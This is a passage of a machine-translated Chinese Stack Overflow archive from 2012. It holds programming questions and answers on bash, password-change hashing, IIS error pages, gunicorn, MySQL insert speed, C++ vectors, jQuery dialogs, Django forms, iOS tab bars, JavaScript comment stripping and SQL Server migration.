fi 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T19:33:10.940

这应该适合你：

```
DB_CONFIG=(
  "DB_NAME=>"
  "DB_USER=>root"
  "DB_PASSWORD=>root"
  "DB_HOST=>127.0.0.1"
  "DB_CHARSET=>utf8"
  "DB_COLLATE=>"
);  

for prop in ${DB_CONFIG[@]}; do
  key=${prop%%=>*}
  value=${prop##*=>}

  if [[ "$key" == "DB_HOST" ]]; then 
       db_host="$value"
  elif [[ "$key" == "DB_PASSWORD" ]]; then  
       db_password="$value"
  fi  
done

echo "$db_host" "$db_password" 
```

你错过了 after`[[`和 before的空间`]]`。您还缺少`fi`s，它对应于 C 或 Java 中的右大括号，并且是 bash 所必需的。此外，if 语句需要一个`;`after 条件测试。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-01T19:46:53.430

这是一个很棒的 bash 脚本快速参考指南

[http://linuxconfig.org/Bash_scripting_Tutorial](http://linuxconfig.org/Bash_scripting_Tutorial)

# hash - 强制进行大量密码更改而不保存为纯文本的最佳方法？

> ID：10403050
> 
> 赞同：3
> 
> 时间：2012-05-01T19:23:39.450
> 
> 标签：hash, passwords

试图提出一种加密安全的方法来散列用户的密码，以便我能够判断用户选择的新密码是否与原始密码“显着不同”，而无需以明文形式保存原始密码。这是可行的吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T19:33:58.570

您让用户输入他们的旧密码和新密码（无论如何您*都应该这样做）。*将旧的哈希值与您存储的旧哈希值进行比较以进行验证，然后比较提供的两个明文密码：旧的和新的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T19:34:59.023

不，不是，这就是散列的全部想法！

您需要使用可逆加密。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-01T19:35:39.987

这是一种可能的方法：

*   要求用户输入他的旧密码和新密码
*   检查旧密码是否正确
*   比较两个明文密码并检查相似性（使用[模糊匹配](http://en.wikipedia.org/wiki/Approximate_string_matching)之类的东西）

# iis-7.5 - 即使使用自定义 404 错误页面，也会为未知文件扩展名获取默认 404 错误页面

> ID：10403055
> 
> 赞同：4
> 
> 时间：2012-05-01T19:23:50.097
> 
> 标签：iis-7.5

我们设置了一个自定义的 404 错误页面，以便显示一个“漂亮”的页面，而不是默认的 IIS 页面。

当尝试访问具有已知文件扩展名（例如[http://mydomain/dumb.aspx](http://mydomain/dumb.aspx)）的不存在页面时，将显示自定义 404 页面。

当尝试访问具有未知文件扩展名的文件（例如[http://mydomain/index.dumb](http://mydomain/index.dumb)）时，会显示默认的 404 错误页面。

令我困惑的是 IIS Web 核心正在处理错误：

> ModuleName：IIS Web 核心
> 通知：16
> HttpStatus：404 HttpReason：未找到
> HttpSubStatus：0错误代码
> ：2147942402 ConfigExceptionInfo：通知：MAP_REQUEST_HANDLER 错误代码：系统找不到指定的文件。(0x80070002)

但是考虑到配置的自定义错误页面：

```
 <httpErrors errorMode="Detailed">
    <remove statusCode="404" subStatusCode="-1" />
    <error statusCode="404" prefixLanguageFilePath="" path="/httpError" responseMode="ExecuteURL" />
</httpErrors> 
```

我们确实有 * 的处理程序映射，但没有*.* . 这可能是问题的原因吗？什么是正确的配置？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-04T12:13:53.270

只需将 httpErrors 节点的 errorMode 属性从详细更改为自定义。

从：

```
<httpErrors errorMode="Detailed"> 
```

至：

```
<httpErrors errorMode="Custom"> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T19:26:08.150

我在博客上写过这个。您可能没有正确设置 web.config。阅读我的帖子以了解如何做到这一点。您需要在 system.webserver 节点中使用它。

```
<httpErrors existingResponse="PassThrough" /> 
```

[http://blog.aquabirdconsulting.com/2012/04/19/setting-up-asp-net-mvc-error-pages/](http://blog.aquabirdconsulting.com/2012/04/19/setting-up-asp-net-mvc-error-pages/)

# cron - OpenERP 和 Gunicorn

> ID：10403056
> 
> 赞同：7
> 
> 时间：2012-05-01T19:23:59.233
> 
> 标签：cron, wsgi, openerp, gunicorn

是否可以为 openerp 6.1 和 gunicorn 提供更具体的配置？我有兴趣在 wsgi Web 服务器上运行 openerp，并且我有兴趣了解有关 cron 任务管理的更详细信息 :) 网络上的文档很差。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T11:22:51.977

请看[http://thu.openerp.com/open-days-2012/gunicorn.html](http://thu.openerp.com/open-days-2012/gunicorn.html)

编辑：他引用了 openerp-cron-worker 脚本，它目前正在合并到 6.1 中，检查代码[https://code.launchpad.net/~openerp-dev/openobject-server/6.1-here-comes -the-bogeyman-vmt](https://code.launchpad.net/~openerp-dev/openobject-server/6.1-here-comes-the-bogeyman-vmt)

Edit2：同时 openerp-cron-worker 脚本已登陆 lp:openobject-server/6.1 at rev4184 ( [http://bazaar.launchpad.net/~openerp/openobject-server/6.1/revision/4184](http://bazaar.launchpad.net/~openerp/openobject-server/6.1/revision/4184) )

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-16T09:10:00.707

我知道如果您查看 Green Unicorn (gunicorn) 配置链接 [gUnicorn config](http://gunicorn.org/configure.html) ，它的文档很差，您会发现很多参数可用于 gunicron 进程和工人管理，例如

1) worker_connections 最大并发客户端数。在这种情况下，您的配置文件可以配置如下：

```
worker-connections = 1000 
```

2) max_requests 一个worker在重启前将处理的最大请求数。

```
max_requests = 2 
```

3) timeout 沉默超过这么多秒的工人被杀死并重新启动。

```
timeout = 30 
```

为了安全：

4）limit_request_line

HTTP 请求行的最大大小（以字节为单位）。

```
limit_request_line = 4094 
```

因此，您可以使用此参数配置您的服务器配置文件，这将帮助您更好地进行流程管理。

希望这会帮助你。如果我遗漏了什么，请告诉我。

问候

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-20T14:14:42.187

不是一个解决方案，但这个额外的指针可能会有所帮助：有一个 OpenERP[框架更改文档](http://www.slideshare.net/openobject/openerp-61-framework-changes)描述了 Gunicorn 的使用。请参见第 12-15 页。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-02T09:10:21.730

我猜某事已经改变了。

我在 6.1.1 中没有看到任何与单独的 cron-worker 脚本相关的代码。

而且好像[被删了](https://code.launchpad.net/~openerp-dev/openobject-server/6.1-multicorn-al/+merge/109544)。

伙计们，有人在生产中使用 Gunicorn 运行 OpenERP 吗？您如何处理 cron 问题？

# mysql - 非常慢的 Innodb 插入：空表中的 1K 条目需要 65 秒

> ID：10403057
> 
> 赞同：0
> 
> 时间：2012-05-01T19:24:01.617
> 
> 标签：mysql, insert, innodb, database-performance

我注意到我的 mysql 插入非常慢。为了测试和演示，我使用了下表：

```
+----------+-----------------------------------------------+
| Table    | Create Table                                  |
+----------+-----------------------------------------------+
| ik_b64_8 | CREATE TABLE `incr_tbl` (
  `cnt` int(11) NOT NULL,
  PRIMARY KEY (`cnt`)
) ENGINE=InnoDB DEFAULT CHARSET=ascii COLLATE=ascii_bin |
+----------+-----------------------------------------------+ 
```

和python代码：

```
def profile_basic(cnt):
    db = database.Connection("localhost","testing_delme","root", "")
    t1 = time.time()
    for ii in range(cnt):
        db.execute("INSERT INTO testing_delme.incr_tbl VALUES (%s)", ii)
    print time.time() - t1 
```

当我在一个空表上运行这个只插入代码时，1K 插入需要 65 秒。我有 innodb_flush_log_at_trx_commit = 1 我需要它，因为表不能丢失任何数据。我的问题是，有了这套，插入会变得这么慢吗？还是我还缺少其他东西？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T20:30:19.507

“不能丢失任何数据。” 这只是程度的问题。如果不刷新，您可能会丢失最后一秒的数据。使用刷新，您可能只会丢失当时正在写入的内容。你真的想为此大受打击吗？

此外，如果您的磁盘损坏，无论如何您都会丢失自上次备份以来的所有数据，从长远来看这是不可避免的并且涉及更多数据，因此我更担心进行频繁备份。

禁用冲洗。我认为由于所有磁盘活动，每次插入很容易花费数十甚至数百毫秒。表上有一些索引会使情况变得更糟。

尽管如此，如果您绝对必须在每次写入时刷新，那么如果您将数据库放在 SSD 上，您也会看到性能大幅提升。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-20T12:52:57.400

我认为您达到了每秒事务数的限制。您的每个插入都被视为一个单独的事务，您必须处于自动提交模式。

(1) 在一条 SQL 语句中插入多行，就可以了：

```
insert into incr_tbl values (1),(2),(3).... 
```

Python 等价物是这样的：

```
db.execute("insert into incr_tbl values %s" % ",".join(["(%s)" % i for i in range(xx)])) 
```

(2) 或者，您可以显式启动事务：

```
db = ...(autocommit=False)
db.begin_transaction()
for i in xx: db.execute(... insert i ...)
db.commit() 
```

如果你有一台不错的服务器，你的 tx 速率应该远高于每秒 15 次，所以检查你的机器和 mysql 设置。即使您每次都提交到磁盘并等待（sqlite），您应该在商品硬盘上达到 100 tx/s。当数据库位于 USB 闪存时，我只看到过这么低的速率。另一个可能的解释是你的 python 离数据库很远，网络延迟会影响性能，在这种情况下（1）有帮助，（2）没有。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-02-15T07:36:11.073

随着`db.execute()`你一个一个地插入，它会很慢。使用循环建立一个列表，然后做一个批量插入，即`db.executemany()`

```
def profile_basic(cnt):
    import mysql.connector, time
    cnx = mysql.connector.connect("localhost","testing_delme","root", "")
    db = cnx.cursor()
    list_ii = []
    t1 = time.time()
    for ii in range(cnt):
        list_ii.append(ii)
    # One bulk insert
    db.executemany("INSERT INTO testing_delme.incr_tbl VALUES (%s)", list_ii)
    # Don't forget to commit
    db.commit()
    print time.time() - t1 
```

# c++ - C ++将数组大小分配为变量并在运行时为变量赋值？

> ID：10403059
> 
> 赞同：2
> 
> 时间：2012-05-01T19:24:23.923
> 
> 标签：c++, arrays

我对 C++ 编程真的很陌生，所以请原谅我的愚蠢问题。

我有一个看起来像这样的数组：

```
double myarray [15][20000]; // Works ok but stack overflow error if I change 15 to about 200 
```

我想实现这样的目标：

```
double myarray [total][20000]; 
```

然后在运行时我希望用户输入**total**的值：

```
cin>>total 
```

请就如何实现这一点以及解决此问题和避免堆栈溢出的最佳实践提出建议。

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-01T19:26:41.083

使用s`vector`的a `vector`：

```
int total;

cin >> total;

//                                      (1)                        (2)
std::vector<std::vector<double>> myVec(total, std::vector<double>(20000));
// (1) is the first dimension and (2) is the second dimension 
```

您可以像使用数组一样使用它们，并且不会出现堆栈溢出：

```
myVec[0][4] = 53.24;
cout << myVec[0][4]; 
```

如果需要，您甚至可以即时将它们变大。

您会遇到堆栈溢出，因为堆栈通常非常小，并且您试图在其上分配太大的数组。`vector`在免费存储上使用动态分配的内存，这通常*要*大得多，并且不会给你一个溢出错误。

此外，在 C++ 中，静态数组的大小必须在编译时知道，这就是为什么您不能读取数字并使用它的原因，而使用`vector`s 您可以在运行时调整它们的大小。

# jquery - 需要使用动画功能增加jquery对话框的高度和宽度

> ID：10403066
> 
> 赞同：1
> 
> 时间：2012-05-01T19:25:16.830
> 
> 标签：jquery, jquery-ui

我正在显示最初出现在屏幕中心的高度和宽度较小的 jquery 对话框。一段时间后，我将不可见的 div 内容插入对话框并使用动画功能增加对话框的高度和宽度。

这是代码

```
<script type="text/javascript">
     $(document).ready(function () {

         $("#dialog").dialog({
             autoOpen: false,
             bgiframe: true,
             height: 85,
             width: 200,
             modal: false,
             draggable: true,
             resizable: false,
             position: 'center',
             show: {
                 effect: "fade",
                 duration: 1000
             },
             hide: {
                 effect: "fade",
                 duration: 500
             },
             open: function (type, data) {
                 $(this).parent().appendTo("form");
             }
         });

         $("#btnfax").click(function () {
             $(".ui-dialog").css({ position: 'fixed', top: '50%', left: '50%', marginleft: '-100px', margintop: '-50px' });
             $("#dialog").removeClass('ui-dialog-content ui-widget-content').addClass('BusyStyles').html('');
             $("#dialog").dialog("open")

             $.doTimeout(1000, function () {
                 $("#dialog").html($('#content').html());

                 $(".ui-dialog").animate({
                     left: (($(window).width() - $('#dialog').outerWidth()) / 2) + 'px', // or you might want to use .outerWidth()
                     top: (($(window).height() - $('#dialog').outerHeight()) / 2) + 'px',
                     height: (($('#dialog').outerHeight() -  $('#content').outerHeight()) + $('#content').outerHeight()) + 'px',
                     width: (($('#dialog').outerWidth() - $('#content').outerWidth()) + $('#content').outerWidth()) + 'px'
                 }, 500,
                function () {
                     $("#dialog").removeClass("BusyStyles").find('#FaxMain').fadeIn(2000);
                });

             });
             return false;
         });

     });
 </script> 
```

我想以这种方式增加对话框的高度和宽度，因此我的 div 内容将在对话框内正确显示，但我无法这样做。当对话框显示时，它的高度和宽度是 85 和 200，但我的 div 大小是 300/300。我需要以这种方式增加对话框的高度和宽度，这样我的 300/300 div 将正确显示在对话框中。我使用动画功能，结果高度和宽度会随着动画位的增加而增加，并且它也会显示在页面的中心。所以请指导我使用什么逻辑来增加对话框的高度和宽度，结果我的 div 内容将显示在对话框中，并且对话框应该出现在页面中心，同时增加高度和宽度。请纠正我的代码中我使用动画功能增加对话框高度和宽度的区域。谢谢

* * *

这个区号需要改正

```
$(".ui-dialog").animate({
                 left: (($(window).width() - $('#dialog').outerWidth()) / 2) + 'px', // or you might want to use .outerWidth()
                 top: (($(window).height() - $('#dialog').outerHeight()) / 2) + 'px',
                 height: (($('#dialog').outerHeight() -  $('#content').outerHeight()) + $('#content').outerHeight()) + 'px',
                 width: (($('#dialog').outerWidth() - $('#content').outerWidth()) + $('#content').outerWidth()) + 'px'
             }, 500,
            function () {
                 $("#dialog").removeClass("BusyStyles").find('#FaxMain').fadeIn(2000);
            }); 
```

请看和建议。谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-16T12:54:09.810

这对我有用：

```
$("#dialog").parents(".ui-dialog:first").animate({
    width: '600px',
    height: '500px'
}, {
    duration: 500,
    step: function () {
        $("#dialog").dialog('option', 'position', 'center');
    }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T21:12:17.737

正如我昨天在这里发布这个问题时提到的那样： [jquery dialog height & width issue](https://stackoverflow.com/questions/10384712/jquery-dialog-height-width-issue)

只需使用 minHeight 和 minWidth 而不是 jquery 对话框方法的高度/宽度属性。

他们的文档在这里：http: [//jqueryui.com/demos/dialog/](http://jqueryui.com/demos/dialog/)

# c++ - 使标准控制台出现在快板中

> ID：10403068
> 
> 赞同：4
> 
> 时间：2012-05-01T19:25:19.097
> 
> 标签：c++, console, allegro

当我运行 allegro 程序时，没有标准的文本控制台。我怎样才能让它出现，所以我可以使用 cout 和 cin 呢？我正在使用 Dev-Cpp 和 allegro 4.2.1。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T20:44:08.943

两种方式：

*   将应用程序创建为控制台应用程序

![在此处输入图像描述](../Images/11ae28d24d60af67f47ef6a58382179a.png)

*   需要时使用 Win32 API 分配和附加控制台：

    *   [创建控制台](http://msdn.microsoft.com/en-us/library/windows/desktop/ms682528(v=vs.85).aspx)
    *   [附加到控制台](http://msdn.microsoft.com/en-us/library/windows/desktop/ms681953(v=vs.85).aspx)
    *   [关闭控制台](http://msdn.microsoft.com/en-us/library/windows/desktop/ms682048(v=vs.85).aspx)

# c++ - 在VS2010调试模式下启用多核编译？

> ID：10403072
> 
> 赞同：2
> 
> 时间：2012-05-01T19:25:45.457
> 
> 标签：c++, visual-studio-2010, visual-c++

如何在调试模式下使用计算机上的所有内核生成代码？我可以在发布模式下快速安静地生成代码，但在调试中它真的很慢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T19:29:07.913

这个问题不清楚。你的意思是你的编译在 Release 中很快，但在 Debug 中很慢？如果是这样，那么解决方案是在项目设置中为 Debug 目标设置 Enable Multiprocessor Compilation 选项。

但是如果你说你的应用程序的调试版本很慢，那么没有什么神奇的选择可以提高使用所有内核的速度——你需要设计你的应用程序以利用多个内核开始。

# annotations - 使用 Doctrine 2 自定义注释时，获取具有特定注释的所有实体类的数组的最佳方法是什么？

> ID：10403077
> 
> 赞同：1
> 
> 时间：2012-05-01T19:26:10.017
> 
> 标签：annotations, doctrine-orm

我正在阅读[有关 Doctrine 中的自定义注释的文档文章](http://docs.doctrine-project.org/projects/doctrine-common/en/latest/reference/annotations.html)。我知道我可以用它`$reader->getClassAnnotations($reflClass)`来检索特定类的注释。获取具有特定注释的所有实体类的列表的最佳方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-26T18:56:09.847

```
$driver = new \Doctrine\ORM\Mapping\Driver\PHPDriver($entities_path );

$classes = $driver->getAllClassNames();

foreach ($classes as $key => $class) {     

      $reader = new \Doctrine\Common\Annotations\AnnotationReader();

      $annotationReader = new \Doctrine\Common\Annotations\CachedReader(
                                              $reader, 
                                              new \Doctrine\Common\Cache\ArrayCache()
                                           );

      $reflClass = new ReflectionClass("\Entities\\".$reportableClass);
      $annotation = $annotationReader->getClassAnnotation(
                                                     $reflClass, 
                                                     'Custom_Annotation'
                                                  );
      if (is_null($annotation)) {
          unset($classes[$key]);
      }
} 
```

Doctrine 的 AbstractFileDriver(Doctrine\ORM\Mapping\Driver\AbstractFileDriver.php) 文档说：

> 基于文件的元数据驱动程序的基本驱动程序。
> 
> 文件驱动程序以按需加载各个类的映射文件的模式运行。这要求用户遵守每个类 1 个映射文件的约定，并且映射文件的文件名必须对应于完整的类名，包括命名空间，命名空间分隔符为“\”，替换为点“.”。

您也可以使用 DatabaseDriver (Doctrine\ORM\Mapping\Driver\DatabaseDriver.php) 来代替 PhpDriver。

# c# - 如何管理内存以解决 C# 中的 NotEnoughMemoryException

> ID：10403089
> 
> 赞同：0
> 
> 时间：2012-05-01T19:26:50.180
> 
> 标签：c#, memory-management

我的内存是 4GB（2.99GB 可用，但我不知道为什么）。在C# Visual Studio 2010项目中使用Bluebit Library处理Matrix时，在Windows Form Application中执行代码并连接数据库后，出现NotEnoughMemoryException（没有足够的内存继续执行），使用的物理内存为2.14GB，但是在控制台应用程序中单独使用代码时不会出现任何异常。

```
StreamWriter aWr = new StreamWriter("aMatrix.mtx");
Matrix aMatrix = new Matrix(termsList.Count, Docs.Count);
/////load aMatrix from DataBase and aMatrix[8200, 40]

SVD svd = new SVD(aMatrix);
StreamWriter sWr = new StreamWriter("sMatrix.mtx");
Matrix S = svd.S.SubMatrix(0, k - 1, 0, k - 1);
for (int row = 0; row < S.Rows; row++)
{
        for (int col = 0; col < S.Cols; col++)
            sWr.Write(S[row, col] + "\t");
        sWr.Write("\n");
}
sWr.Close();

StreamWriter uWr = new StreamWriter("uMatrix.mtx");
Matrix U = svd.U;
nt endRaws = U.Rows - 1;
U = U.SubMatrix(0, endRaws, 0, k - 1);
for (int row = 0; row < U.Rows; row++)                                                      
{
    for (int col = 0; col < U.Cols; col++)
        uWr.Write(U[row, col] + "\t");
    uWr.Write("\n");
}
uWr.Close();

StreamWriter vWr = new StreamWriter("vMatrix.mtx");
Matrix V = svd.V;
endRaws = V.Rows - 1;
V = V.SubMatrix(0, endRaws, 0, k - 1);
for (int row = 0; row < V.Rows; row++)
{
    for (int col = 0; col < V.Cols; col++)
        vWr.Write(V[row, col] + "\t");
    vWr.Write("\n");
}
vWr.Close();

StreamWriter vtWr = new StreamWriter("vtMatrix.mtx");
Matrix VT = new Matrix(V.Cols, V.Rows);
for (int row = 0; row < V.Rows; row++)
    for (int col = 0; col < V.Cols; col++)
        VT[col, row] = V[row, col];

for (int row = 0; row < VT.Rows; row++)
{
    for (int col = 0; col < VT.Cols; col++)
        vtWr.Write(VT[row, col] + "\t");
    vtWr.Write("\n");
}
vtWr.Close(); 
```

我如何管理我的记忆？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T19:52:02.150

您需要在 x64 模式下构建您的应用程序以使用超过 2Gb 每个进程，请参阅[为什么我的 C# 应用程序中出现内存不足异常？](https://stackoverflow.com/q/597499/1070291)

# django - 将 knockout.js 与 django 表单一起使用？

> ID：10403094
> 
> 赞同：14
> 
> 时间：2012-05-01T19:27:08.960
> 
> 标签：django, knockout.js

我希望为我的客户端代码添加一些结构，并且一直在阅读`knockout.js`. 我一直在阅读文档并且有一个简单的问题要问 - 因为淘汰赛需要用户向`data-bind`html 元素添加属性，所以它使用表单的最佳方式是什么`django`，因为目前我正在使用`{{ form.as_p }}`

我很好奇我应该如何以及在哪里形成输入`view model`（如果它在 Django 的表单字段中，或者没收`{{ form.as_p }}`并在 html 中输入。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-05-01T20:28:10.563

您可以使用小部件将自定义属性添加到表单元定义中的字段。

```
class SomeForm(forms.ModelForm):
    class Meta:
        model = SomeModel
        widgets = {'field_name1': forms.Textarea(attrs={'data-bind':'value: field1'}),
                   'field_name2': forms.TextInput(attrs={'data-bind':'value: field2'})} 
```

例如，第一个字段将被渲染：

```
<textarea id="id_field_name1" name="field_name1" data-bind="value: field1"></textarea> 
```

**更新：** 作为奖励，这里有一种简单的方法来更改表单中每个字段的属性，例如，如果它们都需要特定的类（有助于其他 js 插件或 css 样式）

```
 def __init__(self, *args, **kwargs):
        super(SomeForm, self).__init__(*args, **kwargs)
        for name, field in self.fields.items():
            field.widget.attrs['class'] = 'some_form_field'
            # this could be used in your case if the Django field name is the
            # same as the KO.js field name
            field.widget.attrs['data-bind'] = 'value: %s' % name 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-14T23:24:11.680

另一种方法是使用[django-crispy-forms](http://django-crispy-forms.readthedocs.org/)`data-bind`并在[布局](http://django-crispy-forms.readthedocs.org/en/latest/layouts.html)中定义属性：

```
def __init__(self, *args, **kwargs):
    super(SomeForm, self).__init__(*args, **kwargs)
    self.helper = FormHelper()
    self.helper.layout = Layout(
        Div('field_1',
            Field('field_2', data_bind='value: field_2')),
        HTML("{% if success %} <p data-bind="css: { success: success_flag }">Operation was successful</p> {% endif %}"),
    ) 
```

然后在模板中你只做：

```
{% crispy form form.helper %} 
```

瞧。

Cripsy-forms 比这更强大，它允许您定义自己的[布局模板](http://django-crispy-forms.readthedocs.org/en/latest/layouts.html#overriding-layout-objects-templates)等。

# ios - 修改父视图控制器中的标签栏项目

> ID：10403096
> 
> 赞同：0
> 
> 时间：2012-05-01T19:27:25.500
> 
> 标签：ios, ios5, uitabbarcontroller, xcode4.2

在prepareForSegue期间是否可以修改父视图控制器中的标签栏项目？基本上，我试图在父控制器中插入逻辑，其中两个可能的选项卡栏项目之一可能会在 segue 时被删除。

我已经尝试了一些类似的东西：

```
- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender
{
    if ([segue.identifier isEqualToString:@"identifierOfInterest"]) {
        UITabBarController *tabBarController = (UITabBarController *)segue.destinationViewController;

        // Attempt 1
        NSMutableArray *items = [[tabBarController.tabBar items] mutableCopy];
        [items removeObjectAtIndex:1];
        [tabBarController.tabBar setItems:items animated:YES];

        // Attempt 2
        NSMutableArray *items = [[tabBarController viewControllers] mutableCopy];
        [items removeObjectAtIndex:1];
        [tabBarController setViewControllers:items];
    }
} 
```

不幸的是，这两条消息都会导致应用程序崩溃，并出现以下错误：

尝试1：

```
Directly modifying a tab bar managed by a tab bar controller is not allowed. 
```

尝试2：

```
[UITabBarItem parentViewController]: unrecognized selector sent to instance 
```

我正在使用 Xcode 4.2、iOS 5 和 UI 标签栏控制器作为情节提要对象，因此标签栏或任何东西都没有出口。

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-05T17:41:09.427

通常在 TabBar 应用程序中，AppDelegate 拥有（或引用）标签栏控制器，因为它是“主”视图控制器。您不能使用标签栏视图控制器，或者至少您不应该这样做。如果您需要让应用程序的标签栏控制器执行某些操作，请向应用程序委托实例发送一条消息，该实例应具有对标签栏控制器的引用，以执行该工作。

IE

```
//In View Controller handling seque
- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender
{
    [[[UIApplication sharedApplication] delegate] performSelector:@selector(doTabBarWork:) withObject:data];
}

//In the App delegate
-(void)doTabBarWork:(id)data
{
    //The "mainTabBarController" instance needs to already be set
    NSMutableArray *viewControllers =  [[self.mainTabBarController viewControllers] mutableCopy];
    [viewControllers removeLastObject];
    [self.mainTabBarController setViewControllers:viewControllers animated:YES];
} 
```

# javascript - 希望从大量 javascript 文件中删除评论

> ID：10403098
> 
> 赞同：7
> 
> 时间：2012-05-01T19:27:29.037
> 
> 标签：javascript, comments, minify

这是我的困境：

我是 javascript 的菜鸟（目前正在实习并帮助维护两个电子商务网站）。我最近被指派删除我们的 javascript 库中出现的所有评论（超过 25,000 条评论！）。显然我想找到一个函数或一些预先存在的程序可以解析代码，删除 // 或 */... 之后的所有字符

我研究了一些在线可用的缩小器，例如 Yui、jscompressor.com 和 uglifyJS，它们可以使这项任务更加自动化，但也存在一些问题。要么它们过于激进（缩短变量名、删除所有空格等），要么它们要求您一次输入一行或一个文件。我正在处理数以千计的 .js 文件。

附加细节：我们的开发环境是Eclipse IDE和xammp；语言是html、php、css。

任何可以满足我需求的程序建议都会很棒！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-16T14:22:53.963

仔细看看 uglifyjs。默认情况下，它既不压缩也不压缩（您必须分别提供 -c 和 -m 选项），并且您可以详细选择它执行的压缩类型，甚至可以指定正则表达式的级别要删除的评论。而且，如果您愿意的话，您甚至可以在外出时进行漂亮的打印。那么使用它有什么问题呢？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-05-28T12:31:50.103

I know this question is a few years old - but all the Javascript comment strippers I found couldn't handle the 2.6mb Javascript file I was trying to strip.

I created a jsfiddle with the following code, then pasted the 2.6mb file into the textbox and it worked for me:

```
$("textarea").val($("textarea").val().replace(/\/\*([^*]|[\r\n]|(\*+([^*\/]|[\r\n])))*\*+\//g,"")); /*remove these comment types*/

$("textarea").val($("textarea").val().replace(/\/\/.*/g,"")); // remove these comment types 
```

[https://jsfiddle.net/40okonqo/](https://jsfiddle.net/40okonqo/)

Hope it helps someone.

Credit: I used information found here to help with the regular expression: [http://blog.ostermiller.org/find-comment](http://blog.ostermiller.org/find-comment)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-02-06T17:52:19.113

事实上，构建一个从 javascript 文档中删除所有注释的正则表达式并不容易。

基本解决方案是使用：

```
 yourJavascriptString.replace(/\/\*.+?\*\/|\/\/.*(?=[\n\r])/g, ''); 
```

不幸的是，它并不总是有效。如果您需要更完整的解决方案，请访问此网站：http: [//james.padolsey.com/javascript/removing-comments-in-javascript/](http://james.padolsey.com/javascript/removing-comments-in-javascript/)

# sql-server - 移动了一个数据库，现在存储过程运行缓慢

> ID：10403100
> 
> 赞同：1
> 
> 时间：2012-05-01T19:27:47.977
> 
> 标签：sql-server, sql-server-2005

我正在将数据库备份从 SQL Server 2000 移动到 SQL Server 2005。

他们运行的硬件是等效的。

鉴于此，存储过程在 SSQL2005 上运行时不应该至少运行得一样快（如果不是更快的话）吗？数据*完全*一样。但是，它们的运行速度要慢 5 倍。

在将数据库恢复到 SSQL2005 后，我重新索引了数据库并重置了它的统计信息。

目瞪口呆……

仅供参考，在制作转储文件时，我确保它们经过校验和验证。

我创建了 2 个单独的备份并使用 2 个备份执行此操作并得到相同的结果。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T19:44:46.520

确保更新数据库的兼容级别：

```
ALTER DATABASE dbname SET COMPATIBILITY_LEVEL = 90; 
```

还要确保更新（或重建）索引的统计信息。

当然，您需要确保 SQL Server 2005 已全部修补 - 您是否安装了[Service Pack 4](http://www.microsoft.com/en-us/download/details.aspx?id=7218)和[最新的累积更新](http://support.microsoft.com/kb/2507769)？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T19:42:59.267

SQL Server 2000 和 2005 之间存在许多差异。所以这当然不是不可能的。

假设数据和索引都相同，我将首先查看一个有代表性的程序的执行计划——如果它们不同，那么就需要在那里进行调查，这可能包括参数嗅探问题。

如果一切顺利，那么接下来您可能需要深入研究文件位置，以查看数据和日志文件在驱动器和底层 RAID 等方面的设置是否不同。然后是性能计数器等。

更新：尝试 T 开关 4199， http: [//msdn.microsoft.com/en-us/library/ms188396.aspx](http://msdn.microsoft.com/en-us/library/ms188396.aspx)以获取可用开关等。还要确保您安装了最新的累积更新包。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-01T19:46:07.517

实际上 - 从我在 Microsoft SQL Server Level 3 Support 的时间开始 - 有很多问题，其中一个迫使 2000 数据库在 2005 年运行速度极慢。这是查询优化器 IIRC 的问题（3 年前）忽略设置表扫描的成本，因此将小型表扫描视为低成本，这是昂贵的（大量开销），因此围绕它进行循环。我记得 2005 年有一个案例询问“永远不会完成”。

有一个启动开关来强制旧行为，但我不记得了。现在正在努力寻找。

# r - 修改逻辑回归中的因子名称

> ID：10403104
> 
> 赞同：5
> 
> 时间：2012-05-01T19:28:06.517
> 
> 标签：r, rename

让我首先展示一个示例数据。

```
set.seed(1)
x1=rnorm(10)
y=as.factor(sample(c(1,0),10,replace=TRUE))
x2=sample(c('Young','Middle','Old'),10,replace=TRUE)
model1 <- glm(y~as.factor(x1>=0)+as.factor(x2),binomial) 
```

当我进入`summary(model1)`时，我得到

```
 Estimate Std. Error z value Pr(>|z|)
(Intercept)              -0.1835     1.0926  -0.168    0.867
as.factor(x1 >= 0)TRUE    0.7470     1.7287   0.432    0.666
as.factor(x2)Old          0.7470     1.7287   0.432    0.666
as.factor(x2)Young       18.0026  4612.2023   0.004    0.997 
```

**由于数据是假的，请立即忽略模型估计值**
R 中有没有办法更改出现在最左列的估计值的名称，以便它们看起来更清晰？例如删除 as.factor，并`_`在因子级别之前放置一个。输出应如下所示：

```
 Estimate Std. Error z value Pr(>|z|)
(Intercept)      -0.1835     1.0926  -0.168    0.867
